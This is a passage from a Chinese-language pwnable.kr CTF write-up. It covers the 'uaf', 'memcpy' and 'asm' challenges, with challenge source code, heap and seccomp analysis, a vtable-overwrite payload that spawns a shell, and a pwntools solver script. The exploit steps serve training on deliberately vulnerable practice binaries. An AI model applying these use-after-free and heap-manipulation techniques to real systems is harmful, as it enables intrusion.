<p><strong>这里有个奇怪的点，可以看到 ptr_name 均是指向上一个chunk被复用部分中的除 priv_size 和 size 的剩余部分，可能是编译优化导致的？</strong></p>
<p>注意到是先通过 Man 的虚表去调用 introduce 方法</p>
<pre class=" language-armasm"><code class="language-armasm">pwndbg> x/4 0x401570
0x401570 <vtable for Man+16>:    0x000000000040117a    0x00000000004012d2
0x401580 <vtable for Human>:    0x0000000000000000    0x00000000004015f0
pwndbg> x 0x40117a
0x40117a <Human::give_shell()>:    0x10ec8348e5894855
pwndbg> x 0x4012d2
0x4012d2 <Man::introduce()>:    0x10ec8348e5894855</code></pre>
<p>所以我们只要能覆盖 vptr 使其指向 原地址-8，即0x401570 - 0x8 = 0x00401568，这样经过执行时的+0x8就会调用 give_shell 函数</p>
<p>这里还要注意，free 时先释放的 m 后释放的 w，所以填充时是先填充的 w 后填充 m，所以需要步骤 2 执行两次</p>
<p>另外，由于我们只需要填充 vptr 部分，所需 8 字节是小于释放的 chunk 的，所以会直接填充两次消耗释放的空间即可</p>
<h3 id="解题-15"><a href="#解题-15" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">uaf@pwnable:~$ python -c  'print "\x68\x15\x40\x00\x00\x00\x00\x00"' > /tmp/uafpass
uaf@pwnable:~$ ./uaf 8 /tmp/uafpass
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_f1ag_aft3r_pwning</code></pre>
<p>参考：</p>
<ol>
<li><a href="https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/" target="_blank" rel="noopener">https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/</a></li>
<li><a href="http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/" target="_blank" rel="noopener">http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/</a></li>
</ol>
<h2 id="17-memcpy"><a href="#17-memcpy" class="headerlink" title="17. memcpy"></a>17. memcpy</h2><h3 id="题目-16"><a href="#题目-16" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span>

<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"rdtsc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> dest<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">fast_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>
    size_t i<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// 64-byte block fast copy</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">>=</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        i <span class="token operator">=</span> len <span class="token operator">/</span> <span class="token number">64</span><span class="token punctuation">;</span>
        len <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            __asm__ <span class="token function">__volatile__</span> <span class="token punctuation">(</span>
            <span class="token string">"movdqa (%0), %%xmm0\n"</span>
            <span class="token string">"movdqa 16(%0), %%xmm1\n"</span>
            <span class="token string">"movdqa 32(%0), %%xmm2\n"</span>
            <span class="token string">"movdqa 48(%0), %%xmm3\n"</span>
            <span class="token string">"movntps %%xmm0, (%1)\n"</span>
            <span class="token string">"movntps %%xmm1, 16(%1)\n"</span>
            <span class="token string">"movntps %%xmm2, 32(%1)\n"</span>
            <span class="token string">"movntps %%xmm3, 48(%1)\n"</span>
            <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dest <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
            src <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// byte-to-byte slow copy</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> dest<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hey, I have a boring assignment for CS class.. :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The assignment is simple.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- What is the best implementation of memcpy?        -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 1. implement your own slow/fast version of memcpy -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 2. compare them with various size of data         -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 3. conclude your experiment and submit report     -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This time, just help me out with my experiment and get flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No fancy hacking, I promise :D\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">;</span>
    <span class="token keyword">int</span> e<span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> high<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// allocate memory</span>
    <span class="token keyword">char</span><span class="token operator">*</span> cache1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> cache2 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    src <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    size_t sizes<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// setup experiment parameters</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>e<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span> e<span class="token operator">&lt;</span><span class="token number">14</span><span class="token punctuation">;</span> e<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 2^13 = 8K</span>
        low <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        high <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"specify the memcpy amount between %d ~ %d : "</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> size <span class="token operator">&lt;</span> low <span class="token operator">||</span> size <span class="token operator">></span> high <span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"don't mess with the experiment.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        sizes<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ok, lets run the experiment with your configuration\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// run experiment</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        size <span class="token operator">=</span> sizes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"experiment %d : memcpy with buffer size %d\n"</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dest <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span> size <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>
        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// byte-to-byte memcpy</span>
        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>
        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fast_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// block-to-block memcpy</span>
        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"thanks for helping my experiment!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag : ----- erased in this source code -----\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><blockquote>
<p>把源存储器内容值送入目的寄存器,当有m128时,必须对齐内存16字节,也就是内存地址低4位为0.</p>
<p>movntps m128,XMM<br>m128 &lt;== XMM 直接把XMM中的值送入m128，不经过cache,必须对齐16字节.</p>
</blockquote>
<p>注意到当 input &gt; 64 时，会调用 fast_memcpy 下的 movntps 指令，此时必须保证地址对齐</p>
<p>另外 malloc 通过 edx 值返回地址值</p>
<p>考虑到分配 chunk 时有固定 header，32 位下长度为 0x8 (priv_size + size)，所以每次input时，我们通过控制 padding 保证满足下列条件之一：</p>
<ul>
<li>(input + padding + len(header)) % 0x10 &gt; 0x8 这种情况会自动对齐至 0x10</li>
<li>(input + padding + len(header)) % 0x10 = 0x0</li>
</ul>
<p>推荐：<a href="https://www.cnblogs.com/wangaohui/p/5190889.html" target="_blank" rel="noopener">Malloc碎碎念</a></p>
<p><strong>这里添加一下对齐前后的堆内容的对比图片</strong></p>
<h3 id="解题-16"><a href="#解题-16" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

chunk_header <span class="token operator">=</span> <span class="token number">0x8</span>
r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9022</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token number">8</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> chunk_header
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] %d"</span> <span class="token operator">%</span> n<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"experiment!\n"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h2 id="18-asm"><a href="#18-asm" class="headerlink" title="18. asm"></a>18. asm</h2><h3 id="题目-17"><a href="#题目-17" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;seccomp.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 128</span>

<span class="token keyword">void</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    scmp_filter_ctx ctx <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span>SCMP_ACT_KILL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>open<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> SCMP_ACT_ALLOW<span class="token punctuation">,</span> <span class="token function">SCMP_SYS</span><span class="token punctuation">(</span>exit_group<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">seccomp_release</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">char</span> stub<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">char</span> filter<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to shellcoding practice challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span><span class="token operator">*</span> sh <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0x41414000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_FIXED <span class="token operator">|</span> MAP_PRIVATE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stub<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"give me your x64 shellcode: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> sh<span class="token operator">+</span>offset<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">"/home/asm_pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// you are in chroot jail. so you can't use symlink in /tmp</span>
    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>这道题主要涉及<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">seccomp</a></p>
<blockquote>
<p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. seccomp allows a process to make a one-way transition into a “secure” state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system’s resources but isolates the process from them entirely.</p>
</blockquote>
